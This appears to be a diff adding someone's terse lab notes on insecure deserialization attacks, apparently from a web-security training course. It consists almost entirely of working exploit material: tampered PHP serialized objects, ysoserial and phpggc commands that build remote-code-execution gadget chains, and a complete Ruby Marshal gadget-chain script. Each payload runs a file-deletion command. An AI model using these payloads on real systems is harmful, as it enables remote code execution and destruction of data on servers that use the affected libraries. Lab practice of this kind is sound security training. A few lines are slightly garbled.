@@ -1,0 +1,74 @@
+d = echo -n "base64" | base64 -d
+e = echo -n "base64" | base64 -w 0
+
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xhsucl6bswfqjej1optx4lbc1np07kuc";s:11:"avatar_link";s:23"/home/carlos/morale.txt:";}
+
+Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4aHN1Y2w2YnN3ZnFqZWoxb3B0eDRsYmMxbnAwN2t1YyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
+
+=====
+dcode= url
+dcode= base64
+
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+
+https://github.com/frohoff/ysoserial
+https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
+java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+encode base64 code into urlencode
+
+=========
+ java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
+=========
+
+https://github.com/ambionics/phpggc
+/cgi-bin/phpinfo.php
+./phpggc -l (list)
+./phpggc -i Symfony/RCE4
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
+php session.php
+===================
+devcraft.io
+https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+make file rubyid.rb
+
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+  require 'base64'
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "id")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload)
+
+echo "base64code" pepe tr -d '/n'
+===================
